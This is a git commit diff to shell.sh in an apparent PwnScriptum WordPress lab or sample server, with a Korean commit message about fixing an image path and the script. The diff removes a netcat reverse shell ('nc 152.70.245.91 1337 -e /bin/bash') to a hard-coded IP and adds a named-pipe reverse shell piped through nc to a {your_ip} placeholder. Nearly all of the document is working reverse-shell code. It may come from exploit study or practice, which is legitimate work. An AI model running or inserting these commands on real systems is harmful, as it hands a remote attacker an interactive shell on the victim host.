3489c971f37981b07a31fab5282b8fadc21b53ef
JonghyeokHan <ookk2007@naver.com>
2023-10-26 06:23:23 +0900

    [한종혁/ookk2007]: 이미지 경로 오류로 인해 삭제 및 쉘 스크립트 수정

--- wordpress/pwnscriptum/sample-server/shell.sh
+++ wordpress/pwnscriptum/sample-server/shell.sh
@@ -1,15 +1,4 @@
 #!/bin/bash
 
-apt-get update
-apt-get install netcat-traditional -y
-apt-get install expect -y
-
-expect <<EOF
-set timeout 3
-spawn sudo update-alternatives --config nc
-expect "number:"
-	send 2\r
-expect eof
-EOF
-
-nc 152.70.245.91 1337 -e /bin/bash
+mknod /tmp/backpipe p
+/bin/sh 0</tmp/backpipe | nc {your_ip} 1337 1>/tmp/backpipe
